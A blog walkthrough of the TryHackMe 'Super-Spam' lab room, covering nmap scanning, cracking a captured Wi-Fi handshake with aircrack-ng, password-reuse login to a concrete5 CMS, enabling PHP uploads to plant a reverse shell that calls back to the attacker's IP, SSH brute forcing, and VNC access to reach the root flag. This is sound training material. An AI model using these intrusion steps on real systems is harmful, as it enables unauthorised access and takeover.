---
title: TryHackMe Super-Spam
date: 2021-08-13T09:04:14+05:30
lastmod: 2021-08-13T09:04:14+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover: /img/thm.gif # for tryhackMe

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - Super-Spam

draft: false
description: TryHackMe Room Super-Spam solved by Animesh Roy. this is a walkthough. read more...

---

## OverView

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|Super-Spam|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/f8f1345b6e420c2f12ab1cd9f1e2ede9.png)|
| <b> Room [Subscription Required] </b>| [Super-Spam](https://tryhackme.com/room/superspamr)|

## Task 01: Defeat Super-Spam

### General Uvilix

Good Morning! Our intel tells us that he has returned. Super-spam, the evil alien villain from the planet Alpha Solaris IV from the outer reaches of the Andromeda Galaxy. He is a most wanted notorious cosmos hacker who has made it his lifetime mission to attack every Linux server possible on his journey to a Linux-free galaxy. As an avid Windows proponent, Super-spam has now arrived on Earth and has managed to hack into OUR Linux machine in pursuit of his ultimate goal. We must regain control of our server before it's too late! Find a way to hack back in to discover his next evil plan for total Windows domination! Beware, super-spam's evil powers are to confuse and deter his victims.

Flag|ref link|
|---|---|
|What CMS and version is being used? (format: wordpress x.x.x)|[Nmap](#recon)|
|What is the user flag?||
|What type of encryption did super-spam use to send his encrypted messages?||
|What type of encryption did super-spam use to send his encrypted messages?||
|What is the root flag?||

---

## recon

* Nmap

     ```nmap
     sudo nmap -sC -sV -oN nmap/superspam 10.10.72.113
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 09:09 IST
     Nmap scan report for 10.10.72.113
     Host is up (0.18s latency).
     Not shown: 997 closed ports
     PORT     STATE SERVICE  VERSION
     80/tcp   open  ssl/http Apache/2.4.29 (Ubuntu)
     |_http-generator: `concrete5 - 8.5.2`
     |_http-server-header: Apache/2.4.29 (Ubuntu)
     5901/tcp open  vnc      VNC (protocol 3.8)
     | vnc-info: 
     |   Protocol version: 3.8
     |   Security types: 
     |     VNC Authentication (2)
     |     Tight (16)
     |   Tight auth subtypes: 
     |_    STDV VNCAUTH_ (2)
     6001/tcp open  X11      (access denied)

     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 57.09 seconds
     ```

* all port scan

     ```nmap
     # Nmap 7.91 scan initiated Fri Aug 13 09:14:09 2021 as: nmap -p- -sC -sV -oN nmap/all-ports 10.10.72.113
     Nmap scan report for 10.10.72.113
     Host is up (0.16s latency).
     Not shown: 65530 closed ports
     PORT     STATE SERVICE VERSION
     80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
     |_http-generator: concrete5 - 8.5.2
     |_http-server-header: Apache/2.4.29 (Ubuntu)
     |_http-title: Home :: Super-Spam
     4012/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey: 
     |   2048 86:60:04:c0:a5:36:46:67:f5:c7:24:0f:df:d0:03:14 (RSA)
     |   256 ce:d2:f6:ab:69:7f:aa:31:f5:49:70:e5:8f:62:b0:b7 (ECDSA)
     |_  256 73:a0:a1:97:c4:33:fb:f4:4a:5c:77:f6:ac:95:76:ac (ED25519)
     4019/tcp open  ftp     vsftpd 3.0.3
     | ftp-anon: Anonymous FTP login allowed (FTP code 230)
     | drwxr-xr-x    2 ftp      ftp          4096 Feb 20 14:42 IDS_logs
     |_-rw-r--r--    1 ftp      ftp           526 Feb 20 13:53 note.txt
     | ftp-syst: 
     |   STAT: 
     | FTP server status:
     |      Connected to ::ffff:10.17.4.40
     |      Logged in as ftp
     |      TYPE: ASCII
     |      No session bandwidth limit
     |      Session timeout in seconds is 300
     |      Control connection is plain text
     |      Data connections will be plain text
     |      At session startup, client count was 1
     |      vsFTPd 3.0.3 - secure, fast, stable
     |_End of status
     5901/tcp open  vnc     VNC (protocol 3.8)
     | vnc-info: 
     |   Protocol version: 3.8
     |   Security types: 
     |     VNC Authentication (2)
     |     Tight (16)
     |   Tight auth subtypes: 
     |_    STDV VNCAUTH_ (2)
     6001/tcp open  X11     (access denied)
     Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     # Nmap done at Fri Aug 13 09:23:20 2021 -- 1 IP address (1 host up) scanned in 550.84 seconds
     ```

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## FTP

* list files
  
  ![img](https://i.imgur.com/GsmqtMC.png)

* note.txt
  
  ![img](https://i.imgur.com/cUWEyAK.png)

* download the files indside `.cap` directory
  
  ![img](https://i.imgur.com/KamXSql.png)

## Network analysis

Based on packets seems like, WIFI traffic captured for "Wi-Fi Hacking" I'll be using `aircrack-ng` for bruteforce.

* traffic
  
  ![img](https://i.imgur.com/7WVdQQj.png)

* Bruteforce for `Wi-Fi` password!
* command `aircrack-ng SamsNetwork.cap -w /usr/share/wordlists/rockyou.txt`
  
  ![img](https://i.imgur.com/Dt4o8Vp.png)

* no use for it so far

## HTTP

* webpage:
  
  ![img](https://i.imgur.com/BEoCKoE.png)

* there is a `/blog` directory, let's find all users there
  
* usernames:
  
     * Benjamin_Blogger
     * Adam_Admin
     * Donald_dump
     * Lucy_Loser

* now we have 4 possible usernames and 1 passowrd, let's check out our golden `password resuse` policy(password reuse is not a good idea!)

### Bruteforce

* turns out, bruteforce is a bad idea, there is a csrf token and I'm lazy. anyways there are only 4 usernames & 1 password combo. I can do it manually!
* and it worked!!
  
  ![img](https://i.imgur.com/hBrEh7p.png)

* seems like we can now edit pages and there is a nice little manage/setting button
  
  ![img](https://i.imgur.com/8s02MAc.png)

* finally a upload option, I'll be using php reverse shell to getinto the box

     ![img](https://i.imgur.com/cHHGEKq.png)

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

### Uploading backdoor

* find php reverse shell and chage IP to `TUN0`
* `cp /usr/share/laudanum/php/php-reverse-shell.php shell.php`
* change IP to your `tun0` IP
* start a listener
* upload the shell
* curl/access the php file on webserver & get the access
* umm.... seems `php` is not valid type:
  
  ![img](https://i.imgur.com/ByT4jcy.png)

* let's fix it! a little google helped a lot!
  
  ![img](https://i.imgur.com/O0x2eoc.png)

* add `php` to allowed file type
  
  ![img](https://i.imgur.com/ZMrMFQt.png)

* uploaded sucessfully
  
  ![img](https://i.imgur.com/Vc8aCKA.png)

* `CURL` the file to get access to backdoor
  
  ![img](https://i.imgur.com/ykawpQR.png)

* now we have access as `www-data`
  
* Fix shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
* the only `/home` dir we can read is `/personal`
  
  ![img](https://i.imgur.com/aYuF5q8.png)

* got the user flag
  
  ![img](https://i.imgur.com/AaWc9Fn.png)

* another dir is readble, let's check it out:
  
  ![img](https://i.imgur.com/vIMIcjI.png)

* got a interesting file here:
  
  ![img](https://i.imgur.com/vNzqZHH.png)

* let's read this one, this answers the flag question!
  
  ![img](https://i.imgur.com/0MUDwDm.png)

## Encryption keys

* let's download all files to our machine first! 
  
  ![img](https://i.imgur.com/lTLCvYJ.png)

* we got a `xored.py` script. let's use it to decrypt the msg.
* It requires 2 png files. After trying a lot i found out `c2.png` and `c8.png` worked

* that answers the flag question.

## ROOT

Now we have `password` and 4 username, let's Bruteforce for SSH

* SSH Bruteforce
  
  ![img](https://i.imgur.com/mfY1b6Q.png)

* now we have SSH creds. let's login as user
* user Home directory is having wrong file permissions:
  
  ![img](https://i.imgur.com/rJ9BeKb.png)

* let's fix it!
  
     `chmod 777 /home/donalddump`

* now we can read files. `passwd` file looks interesting
  
  ![img](https://i.imgur.com/p3TT71p.png)

* we do have a `VNC server` running on this machine, could it be the password for that?
* let's download this to our machine and try for `VNC` access
  
  ![img](https://i.imgur.com/FDcoAc8.png)

> if you don't have vnc viewer install run this: `sudo apt install tigervnc-viewer`

* run this : `vncviewer -passwd passwd 10.10.28.162:5901`
* you'll see a hidden dir `.nothing` that have `r00t.txt` file. follow my lead copy that file to `/tmp/root` and read with your SSH user
* copy the flag:
  
  ![img](https://i.imgur.com/qVgRpTK.png)

* read the flag
  
  ![img](https://i.imgur.com/7847mP4.png)

* use [CyberChef](https://gchq.github.io/CyberChef/) to decode and read the `root` flag

---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
